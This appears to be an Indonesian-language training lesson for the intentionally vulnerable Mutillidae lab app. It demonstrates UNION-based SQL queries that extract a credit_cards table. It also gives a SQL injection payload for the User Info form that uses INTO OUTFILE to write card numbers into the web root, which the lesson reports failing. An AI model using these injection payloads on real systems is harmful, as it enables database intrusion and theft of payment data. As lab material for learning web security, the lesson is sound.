# Mutillidae Lesson 9

### Union

- Pada server, ketikkan perintah dibawah
```
sudo mysql
```
- Lalu jalankan query berikut
```
show databases; //untuk melihat daftar database
use owasp10; //mengakses database owasp10
show tables; //untuk melihat daftar tabel
desc accounts; //untuk melihat tabel accounts
desc credit_cards; //untuk melihat tabel credit_cards
```
![](Mutillidae%20lesson%208/metasploit_1.png)
- Lalu jalankan query select menggunakan union
```
select * from accounts where username RLIKE '^[0-9]' union select ccid, ccnumber, ccv, expiration, null from credit_cards;
```
![](Mutillidae%20lesson%208/metasploit_2.png)
- RLIKE digunakan untuk filtering kolom dengan karakter depan angka saja (kolom username / ccnumber)
- Hasilnya adalah isi tabel credit_cards yang ditampilkan di tabel accounts.

### Menyimpan Hasil Query di File
- Jalankan perintah
```
select * from accounts where username RLIKE '^[0-9]' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/tmp/CCN.csv' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED by '\n';
```
- Lalu buka file tersebut
```
\! cat /tmp/CCN.csv
```


### Membuka Halaman User Info

- Pada client, buka mutillidae dari browser
```
http://[ip_metasploit]/mutillidae
```
- Buka halaman User Info
```
OWASP TOP 10 -> A1 - SQL Injection -> SQLi Extract Data -> User Info
```
![](Mutillidae%20lesson%208/1.png)

### SQL Injection dengan Output File
- Pada halaman User Info, lakukan inspect element pada form Name dan ubah nilai size menjadi 100.
```
"size=100"`
```
![](Mutillidae%20lesson%208/2.png)
- Isi form Name dengan string berikut
```
' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/var/www/html/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' -- 
```
- Klik View Account Details
![](Mutillidae%20lesson%209/1.png)
- Hasil error tidak bisa menulis file.
![](Mutillidae%20lesson%209/2.png)
